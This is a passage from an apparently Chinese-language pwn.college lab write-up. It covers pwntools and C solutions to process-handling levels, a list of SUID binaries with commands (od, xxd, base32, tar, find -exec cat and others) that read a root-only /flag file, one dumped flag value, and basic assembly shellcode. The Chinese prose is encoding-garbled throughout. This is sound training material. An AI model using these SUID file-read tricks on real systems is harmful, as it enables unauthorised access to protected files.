of visited directories is kept in the global list _dh, and the</strong><br>  <strong>magic %cd command can be used to go to any entry in that list.</strong> </p></li><li><p>Auto-parentheses and auto-quotes (adapted from Nathan Grayâ€™s LazyPython)</p><ol><li><p>Auto-parentheses</p><p> Callable objects (i.e. functions, methods, etc) can be invoked like<br> this (notice the commas between the arguments)::</p><div class="hljs code-wrapper"><pre><code> In [1]: callable_ob arg1, arg2, arg3</code></pre></div><p> and the input will be translated to this::</p><div class="hljs code-wrapper"><pre><code> callable_ob(arg1, arg2, arg3)</code></pre></div><p> This feature is off by default (in rare cases it can produce<br> undesirable side-effects), but you can activate it at the command-line<br> by starting IPython with <code>--autocall 1</code>, set it permanently in your<br> configuration file, or turn on at runtime with <code>%autocall 1</code>.</p><p> You can force auto-parentheses by using â€˜/â€˜ as the first character<br> of a line.  For example::</p><div class="hljs code-wrapper"><pre><code>  In [1]: /globals             # becomes &#39;globals()&#39;</code></pre></div><p> Note that the â€˜/â€˜ MUST be the first character on the line!  This<br> wonâ€™t work::</p><div class="hljs code-wrapper"><pre><code>  In [2]: print /globals    # syntax error</code></pre></div><p> In most cases the automatic algorithm should work, so you should<br> rarely need to explicitly invoke /. One notable exception is if you<br> are trying to call a function with a list of tuples as arguments (the<br> parenthesis will confuse IPython)::</p><div class="hljs code-wrapper"><pre><code>  In [1]: zip (1,2,3),(4,5,6)  # won&#39;t work</code></pre></div><p> but this will work::</p><div class="hljs code-wrapper"><pre><code> In [2]: /zip (1,2,3),(4,5,6) ------&gt; zip ((1,2,3),(4,5,6)) Out[2]= [(1, 4), (2, 5), (3, 6)]</code></pre></div><p>IPython tells you that it has altered your command line by<br>displaying the new command line preceded by â€“&gt;.  e.g.::</p><div class="hljs code-wrapper"><pre><code> In [18]: callable list -------&gt; callable (list)</code></pre></div></li><li><p><mark>Auto-Quoting</mark> </p><p> You can force auto-quoting of a functionâ€™s arguments by using â€˜,â€™ as<br> the first character of a line.  For example::</p><div class="hljs code-wrapper"><pre><code>  In [1]: ,my_function /home/me   # becomes my_function(&quot;/home/me&quot;)</code></pre></div><p> If you use â€˜;â€™ instead, the whole argument is quoted as a single<br> string (while â€˜,â€™ splits on whitespace)::</p><div class="hljs code-wrapper"><pre><code>  In [2]: ,my_function a b c   # becomes my_function(&quot;a&quot;,&quot;b&quot;,&quot;c&quot;)  In [3]: ;my_function a b c   # becomes my_function(&quot;a b c&quot;)</code></pre></div><p> Note that the â€˜,â€™ MUST be the first character on the line!  This<br> wonâ€™t work::</p><div class="hljs code-wrapper"><pre><code>  In [4]: x = ,my_function /home/me    # syntax error</code></pre></div></li></ol></li></ul><h3 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h3><p>ä»è¿™é¢˜å¼€å§‹ä½¿ç”¨è¿™ä¸ªè„šæœ¬, globå¯æ ¹æ® Unix ç»ˆç«¯æ‰€ç”¨è§„åˆ™æ‰¾å‡ºæ‰€æœ‰åŒ¹é…ç‰¹å®šæ¨¡å¼çš„è·¯å¾„å</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> glob <br><span class="hljs-keyword">import</span> pwn <br>p= pwn.process(glob.glob(<span class="hljs-string">&quot;/challenge/embryo*&quot;</span>), stdout=pwn.PIPE, stdin=pwn.PIPE) <br>p.sendline(<span class="hljs-string">&quot;password&quot;</span>)    <span class="hljs-comment"># è¦åŠ è¿™ä¸€ä¸ª</span><br><span class="hljs-built_in">print</span>(p.read().decode())     <br></code></pre></div></td></tr></table></figure><h3 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h3><p>è¿™é¢˜æ£€æŸ¥å‚æ•°argv[1]. è¦æ³¨æ„çš„æ˜¯pwntoolsçš„processæ–¹æ³•ä»¥å‰æˆ‘éƒ½æ˜¯ç›´æ¥ä½¿ç”¨process(â€œfile/pathâ€), å®é™…ä¸Šæ˜¯å†™åˆ°äº†argv[]çš„ç¬¬0ä¸ªä½ç½®, å¦‚æœ<code>executable(Path to the binary to execute)</code>ä¸ºNone, pwntoolsåˆ™ä¼šä½¿ç”¨argv[0], è¿™å°±æ˜¯ä¸ºä»€ä¹ˆå¾€å‚æ•°é‡Œå†™è·¯å¾„å°±å¯ä»¥æ‰§è¡Œçš„åŸå› .</p><p>å†™æˆè¿™æ ·å³å¯:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> glob <br><span class="hljs-keyword">import</span> pwn <br>p= pwn.process(glob.glob(<span class="hljs-string">&quot;/challenge/embryo*&quot;</span>)+[<span class="hljs-string">&quot;gdncphvdkz&quot;</span>] , stdout=pwn.PIPE, stdin=pwn.PIPE) <br><br><span class="hljs-built_in">print</span>(p.read().decode())     <br></code></pre></div></td></tr></table></figure><h3 id="level18-21"><a href="#level18-21" class="headerlink" title="level18-21"></a>level18-21</h3><ul><li>18: æ˜¯ç¯å¢ƒå˜é‡, åœ¨processçš„å‚æ•°é‡ŒåŠ ä¸ª<code>env=&#123;â€œbalabalaâ€=â€œblablaâ€&#125;</code>å°±å¯ä»¥äº†.</li><li>19: æ˜¯é‡å®šå‘stdin.</li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">import</span> pwn<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/tmp/rmxgbo&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> o:<br>    o.write(<span class="hljs-string">&quot;kmtxemmo\n&quot;</span>)<br>p= pwn.process(glob.glob(<span class="hljs-string">&quot;/challenge/embryo*&quot;</span>), stdout=pwn.PIPE, stdin=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/tmp/rmxgbo&quot;</span>))<br><br><span class="hljs-built_in">print</span>(p.read().decode()) <br></code></pre></div></td></tr></table></figure><p>æœ‰ä¸€ä¸ªé—®é¢˜: ä¸Šé¢çš„ä»£ç åº”è¯¥éƒ½æ˜¯æ­£ç¡®çš„, ä½†æ˜¯åªæœ‰å†è¡¥å……ä¸€å¥p.interactive()çš„æ—¶å€™æœ€åä¸¤è¡Œflagæ‰æ˜¾ç¤ºå‡ºæ¥, åŸå› æš‚æœªçŸ¥æ™“</p><ul><li>20: </li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">import</span> pwn<br>p= pwn.process(glob.glob(<span class="hljs-string">&quot;/challenge/embryo*&quot;</span>), stdout=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/tmp/tkpich&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>), stdin=pwn.PIPE)<br></code></pre></div></td></tr></table></figure><ul><li>21<br>  éœ€è¦æ¸…ç©ºç¯å¢ƒå˜é‡.<br>  æ³¨æ„åˆ°processè¿™ä¸ªå‡½æ•°ä¸­çš„envé»˜è®¤ä¼šç»§æ‰¿pythonçš„ç¯å¢ƒå˜é‡å°±å¯ä»¥äº†, å¿…é¡»æ‰‹åŠ¨æ¸…ç©º</li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> glob,pwn<br>p= pwn.process(glob.glob(<span class="hljs-string">&quot;/challenge/embryo*&quot;</span>), stdout=pwn.PIPE, stdin=pwn.PIPE, env=&#123;&#125;)<br><br><span class="hljs-built_in">print</span>(p.read().decode())<br></code></pre></div></td></tr></table></figure><h3 id="level-22-28"><a href="#level-22-28" class="headerlink" title="level 22-28"></a>level 22-28</h3><ul><li>22: è¿™éƒ¨åˆ†æ˜¯ä½¿ç”¨å‘½ä»¤è¡Œæ‰§è¡Œpythonæ¥æ‰§è¡Œç¨‹åºçš„,  æ¯”è¾ƒç®€å•.</li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> glob,pwn<br>p= pwn.process(glob.glob(<span class="hljs-string">&quot;/challenge/embryo*&quot;</span>))<br>p.interactive()<br></code></pre></div></td></tr></table></figure><ul><li>23-28: é‡å¤ä¸€éä¸Šé¢çš„å·¥ä½œ, æ¯”å¦‚0 environment, redirect stdin and out, ç­‰ç­‰è¿™äº›.</li></ul><h3 id="level-29-34"><a href="#level-29-34" class="headerlink" title="level 29-34"></a>level 29-34</h3><p>ä»è¿™ä¸ªå¼€å§‹å°±è¦ç¼–è¯‘Cç¨‹åºäº†, 29å†™ä¸‹é¢è¿™ä¸€æ®µ, 30è¾“å…¥ä¸€ä¸ªå¯†ç .</p><p>å€¼å¾—æ³¨æ„çš„æ˜¯, å¦‚æœç›´æ¥è°ƒç”¨execve, é‚£ä¹ˆä¼šå¯¼è‡´bashåœ¨æ‰§è¡Œ.</p><p>å¦‚æœæ²¡æœ‰waitpid, é‚£ä¹ˆå­è¿›ç¨‹ä¼šè¢«/docker/init(åœ¨æˆ‘çš„ubuntu20.04ä¸Šæ˜¯/sbin/init)æ¥ç®¡. </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">pwncollege</span><span class="hljs-params">()</span></span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[], <span class="hljs-keyword">char</span>** envp)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> pid = fork();<br>    <span class="hljs-keyword">if</span>(pid == <span class="hljs-number">0</span>)&#123;<span class="hljs-comment">//child process</span><br>        <span class="hljs-keyword">int</span> r=execve(<span class="hljs-string">&quot;/challenge/embryoio_level30&quot;</span>, argv, envp);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, r);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        waitpid(pid);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Parent process termianted.\n&quot;</span>);<br><br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li><strong>31:</strong> çœŸçš„ç»äº†, â€œaâ€åŸæœ¬å†™çš„æ˜¯â€â€, çˆ¶è¿›ç¨‹éƒ½ä¸å¯¹, è¿‡äº†ä¸€ä¼šå„¿é‡æ–°ç¼–è¯‘åˆå¥½äº†, è«åå…¶å¦™.</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">pwncollege</span><span class="hljs-params">()</span></span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv, <span class="hljs-keyword">char</span>** envp)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> pid = fork();<br><br>    <span class="hljs-keyword">if</span>(pid == <span class="hljs-number">0</span>)&#123;<span class="hljs-comment">//child process</span><br>        <span class="hljs-comment">//int r=execve(&quot;/challenge/embryoio_level31&quot;, argv, envp);</span><br>        <span class="hljs-keyword">int</span> r = execl(<span class="hljs-string">&quot;/challenge/embryoio_level31&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;lndhvgwxjx&quot;</span>, <span class="hljs-literal">NULL</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, r);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        waitpid(pid);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Parent process termianted.\n&quot;</span>);<br><br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li>32: ç›´æ¥ä¿®æ”¹envpå¥½åƒä¼šå‡ºé—®é¢˜, åŸå› æœªçŸ¥. </li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">pwncollege</span><span class="hljs-params">()</span></span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv, <span class="hljs-keyword">char</span>** envp)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> pid = fork();<br>    <span class="hljs-keyword">char</span>* argvs[<span class="hljs-number">3</span>];<br>    argvs[<span class="hljs-number">1</span>]=<span class="hljs-string">&quot;jxdefy=fbilpksemj&quot;</span>;    <span class="hljs-comment">//æš‚ä¸”å…ˆæ‰‹åŠ¨è®¾ç½®å§</span><br>    argvs[<span class="hljs-number">2</span>]=<span class="hljs-literal">NULL</span>;<br>    argvs[<span class="hljs-number">0</span>]=<span class="hljs-string">&quot;sldkfj&quot;</span>;<br>    <span class="hljs-keyword">if</span>(pid == <span class="hljs-number">0</span>)&#123;<span class="hljs-comment">//child process</span><br>        <span class="hljs-keyword">int</span> r = execle(<span class="hljs-string">&quot;/challenge/embryoio_level32&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;lndhvgwxjx&quot;</span>, <span class="hljs-literal">NULL</span>, argvs);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, r);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        waitpid(pid);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Parent process termianted.\n&quot;</span>);<br><br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li>33: è¿™ä¸ªå°±æ˜¯cè¯­è¨€ç‰ˆæœ¬çš„é‡å®šä½, è¿˜é™„å¸¦çˆ¶è¿›ç¨‹æ£€æŸ¥çš„é‚£ç§. è€ƒè™‘åˆ°execveç³»åˆ—å‡½æ•°ä¼šç›´æ¥ç»§æ‰¿åŸæ¥è¿›ç¨‹çš„å¤§éƒ¨åˆ†å±æ€§, æ¯”å¦‚è¾“å…¥è¾“å‡ºæµ, æ‰€ä»¥ç›´æ¥å¯¹cç¨‹åºé‡å®šå‘å³å¯, å­è¿›ç¨‹ç›´æ¥ç»§æ‰¿.</li><li>34: è¾“å‡ºé‡å®šå‘.</li></ul><h3 id="level35"><a href="#level35" class="headerlink" title="level35-"></a>level35-</h3><ul><li><p>35: ç”¨è„šæœ¬è¿è¡Œ, å¯ä»¥ä¸éœ€è¦fork, ç›´æ¥execve</p></li><li><p>36: è¾“å‡ºè¦æ˜¯åˆ°catçš„PIPE, ç›´æ¥åœ¨å‘½ä»¤è¡Œé‡Œè¾“å…¥: <code>./c | cat</code>å³å¯</p></li><li><p>37: <code>./c | grep -E &quot;*&quot;</code> ç»“æŸ</p></li><li><p>38: <code>./c | sed &quot;=&quot;</code> </p></li><li><p>39: <code>./c  | rev | rev</code> </p></li><li><p>40: ä½¿ç”¨ç®¡é“é‡å®šå‘stdin, å»çœ‹äº†ä¸‹cä¸­çš„PIPEæ“ä½œ.æš‚æ—¶æ²¡æœ‰å‘ç°æ€ä¹ˆç”¨åœ¨è¿™é“é¢˜ç›®ä¸Š.</p><p><del>ç›´æ¥æ¥ä¸€æ‰‹ä¸‰é‡å¥—å¨ƒ, è¿™æ ·å­catå°±ä¸ä¼šé©¬ä¸Šç»ˆæ­¢äº†</del>. mdä¸ç”¨ä¹Ÿå¯ä»¥, æ˜¯æˆ‘æƒ³å¤æ‚äº†.</p></li></ul><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">./cat | cat | /challenge/embryoio_level40<br></code></pre></div></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//cat.</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">1024</span>];<br>    <span class="hljs-keyword">int</span> n;<br>    <span class="hljs-keyword">int</span> fd = argc == <span class="hljs-number">1</span> ? <span class="hljs-number">0</span> : open(argv[<span class="hljs-number">1</span>],<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">while</span> ((n = read(fd,buf,<span class="hljs-number">1024</span>)) &gt; <span class="hljs-number">0</span> &amp;&amp; write(<span class="hljs-number">1</span>,buf,n) &gt; <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li>41: é‡å®šå‘stdout. ä¸€æ ·åšæ³•.</li><li>42: <code>bash x.sh | cat</code></li><li>43: grep</li><li>44: sed</li><li>45: rev</li><li>46: æˆ‘ç´¯äº†</li></ul><h3 id="level"><a href="#level" class="headerlink" title="level??"></a>level??</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">import</span> pwn<br>pwn.context.log_level = <span class="hljs-string">&quot;DEBUG&quot;</span><br>p2 = pwn.process([<span class="hljs-string">&quot; /usr/bin/sed&quot;</span>, <span class="hljs-string">&quot;-e&quot;</span>, <span class="hljs-string">&quot;s/x/Ã—/&quot;</span>])<br>p1 = pwn.process(glob.glob( <span class="hljs-string">&quot; /chailenge/enbryo* &quot;</span>)ï¼Œstdout=p2.stdin)<br><span class="hljs-built_in">print</span>(p2.readall())<br></code></pre></div></td></tr></table></figure><h1 id="module-2-misuse"><a href="#module-2-misuse" class="headerlink" title="module 2-misuse"></a>module 2-misuse</h1><ul><li><p><a href="https://wiki.archlinux.org/title/File_permissions_and_attributes">æ–‡ä»¶æƒé™</a> </p></li><li></li></ul><h2 id="WP-1"><a href="#WP-1" class="headerlink" title="WP"></a>WP</h2><p>è¿™éƒ¨åˆ†çš„é¢˜ç›®å°±æ˜¯åˆ©ç”¨è¢«è®¾ç½®suidçš„ç¨‹åºæ¥ä»¥rootçš„æƒé™å»è¯»æ–‡ä»¶, æ— è®ºçœ‹èµ·æ¥æ˜¯æœ‰å¤šä¹ˆçš„ä¸å¯èƒ½.</p><p><code>cat head tail rev nano emacs vim od more less sort hd(hexdump) xxd base32(64) split gzip bzip2 zip&amp;unzip</code><br><code>tar ar cpio genisoimage env find make </code></p><ul><li>od: <code>od -t x8z -v -w 10 /flag</code> ç¡¬æ˜¯æ‹¼å‡ºæ¥. </li></ul><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">0000000 6c6c6f632e6e7770 714f6f417b656765 685834544b387868 4e354550757a575a  &gt;pwn.college&#123;AoOqhx8KT4XhZWzuPE5N&lt;<br>0000040 2e337a6d50723671 4d734d54557a5851 0a7d577a49314d54                   &gt;q6rPmz3.QXzUTMsMTM1IzW&#125;.&lt;<br>0000070<br></code></pre></div></td></tr></table></figure><ul><li><p><code>hd /flag</code> (hexdump)</p></li><li><p><code>xxd -c60 /flag</code> æ¯è¡Œ60ä¸ª</p></li><li><p><code>base32 /flag | base32 -d</code> </p></li><li><p>split: split file into pieces. <code>split /flag</code> </p></li><li><p><code>gzip -c /flag | gzip -cd </code> </p></li><li><p>bzip2 æœ‰æ–°çš„æœºåˆ¶, ä¸è¿‡å‘½ä»¤è¡Œå‚æ•°å’Œgzipéå¸¸æ¥è¿‘</p></li><li><p><code>zip - /flag &gt; aa</code> and then<code>cat aa</code>    or    <code>unzip -p aa</code> </p></li><li><p><code>tar cf flag.tar flag</code> then <code>tar -xOf flag.tar</code> ç ”ç©¶äº†åŠå¤©tarçš„å‚æ•°, main operationé‚£å‡ ä¸ªå‚æ•°æ¯æ¬¡å¿…é¡»åŠ ä¸Š. få‚æ•°åç´§è·Ÿæ–‡ä»¶å</p></li><li><p><code>ar c flag.ar flag</code> then <code>cat flag.ar</code> å‘ç°ç»è¿‡rootç”¨æˆ·åˆ›å»ºå®Œarchiveä¹‹åç›´æ¥å°±å¯¹å…¶ä»–ç”¨æˆ·å¯è¯»äº†â€¦æ›´ç®€å•äº†</p></li><li><p>(23- )  cpio genisoimage: ???</p><ul><li><p><code>echo &quot;/flag&quot; | cpio -ov &gt; ~/flag.cpio</code> then <code>cat flagcpio</code> ä¸æ˜¯ç›´æ¥å°†/flagæ”¾åˆ°cpioçš„stdinä¸­â€¦â€¦ä»–åªè¦<u>name-list</u>â€¦â€¦</p></li><li></li></ul></li><li><p>envä¹Ÿè¡Œ?å¤ªç¥å¥‡äº†. <code>env cat /flag</code> </p></li><li><p><code>find /flag -maxdepth 0 -exec cat &#39;&#123;&#125;&#39; \;</code> </p></li><li></li></ul><h1 id="module-3-asm"><a href="#module-3-asm" class="headerlink" title="module 3-asm"></a>module 3-asm</h1><p>å°±æ˜¯æ±‡ç¼–ä»£ç çš„å†™</p><h2 id="3-ç®€å•ä¹˜æ³•"><a href="#3-ç®€å•ä¹˜æ³•" class="headerlink" title="3 ç®€å•ä¹˜æ³•"></a>3 ç®€å•ä¹˜æ³•</h2><p>è¦æ³¨æ„mulæŒ‡ä»¤é»˜è®¤è¢«ä¹˜æ•°æ”¾åœ¨raxé‡Œé¢, ä¹˜æ•°ç”±æˆ‘ä»¬æŒ‡å®š, ç»“æœæ˜¯æ‹¼æ¥è€Œæˆçš„: <strong>RDX:RAX</strong> </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><span class="hljs-keyword">from</span> glob <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>p = process(glob(<span class="hljs-string">&quot;/challenge/e*&quot;</span>))<br><br>shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">mov rax, rdi</span><br><span class="hljs-string">mov rcx, rdx</span><br><span class="hljs-string">mul rsi</span><br><span class="hljs-string">add rax, rcx</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>p.send(asm(shellcode))<br>p.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="4-5-é™¤æ³•"><a href="#4-5-é™¤æ³•" class="headerlink" title="4-5 é™¤æ³•"></a>4-5 é™¤æ³•</h2><p>è¢«é™¤æ•°æ”¾åœ¨<strong>RAX</strong>, é™¤æ•°å¾…å®š, ç»“æœæ”¾åœ¨ <strong>RAX</strong>, ä½™æ•°æ”¾åœ¨<strong>RDX</strong> </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">mov rax, rdi</span><br><span class="hljs-string">div rsi</span><br><span class="hljs-string">mov rax, rdx</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure><h2 id="6-ä½ä½å¯„å­˜å™¨çš„åç§°"><a href="#6-ä½ä½å¯„å­˜å™¨çš„åç§°" class="headerlink" title="6: ä½ä½å¯„å­˜å™¨çš„åç§°"></a>6: ä½ä½å¯„å­˜å™¨çš„åç§°</h2><p>ä½ä½å¯„å­˜å™¨çš„åç§°è¦ç‰¹åˆ«æ³¨æ„, rdiå°±æ˜¯è¿™ä¹ˆå†™é”™äº†, movçš„ä¸¤ä¸ªæ“ä½œæ•°å¦‚æœé•¿åº¦ä¸åŒ¹é…ä¼šæŠ¥é”™:<code>unsupported instruction &#39;mov&#39;</code> </p><table><thead><tr><th><strong>Name</strong></th><th>Notes</th><th>Type</th><th>64</th><th>32</th><th>16</th><th>8</th></tr></thead><tbody><tr><td>rax</td><td>Values are returned from functions in this register.</td><td>scratch</td><td>rax</td><td>eax</td><td>ax</td><td>ah and al</td></tr><tr><td>rcx</td><td>Typical scratch register.Â  Some instructions also use it as a counter.</td><td>scratch</td><td>rcx</td><td>ecx</td><td>cx</td><td>ch and cl</td></tr><tr><td>rdx</td><td>Scratch register.</td><td>scratch</td><td>rdx</td><td>edx</td><td>dx</td><td>dh and dl</td></tr><tr><td><em>rbx</em></td><td><em>Preserved register: donâ€™t use it without saving it!</em></td><td><em>preserved</em></td><td><em>rbx</em></td><td><em>ebx</em></td><td><em>bx</em></td><td><em>bh and bl</em></td></tr><tr><td><em>rsp</em></td><td><em>The stack pointer.Â  Points to the top of the stack (details coming soon!)</em></td><td><em>preserved</em></td><td><em>rsp</em></td><td><em>esp</em></td><td><em>sp</em></td><td><em>spl</em></td></tr><tr><td><em>rbp</em></td><td><em>Preserved register.</em></td><td><em>preserved</em></td><td><em>rbp</em></td><td><em>ebp</em></td><td><em>bp</em></td><td><em>bpl</em></td></tr><tr><td>rsi</td><td>Scratch register.Â  Function argument #2 in 64-bit Linux</td><td>scratch</td><td>rsi</td><td>esi</td><td>si</td><td>sil</td></tr><tr><td>rdi</td><td>Scratch register.Â  Function argument #1 in 64-bit Linux</td><td>scratch</td><td>rdi</td><td>edi</td><td>di</td><td>dil</td></tr><tr><td>r8</td><td>Scratch register.Â  These were added in 64-bit mode</td><td>scratch</td><td>r8</td><td>r8d</td><td>r8w</td><td>r8b</td></tr><tr><td>r9</td><td>Scratch register.</td><td>scratch</td><td>r9</td><td>r9d</td><td>r9w</td><td>r9b</td></tr><tr><td>r10</td><td>Scratch 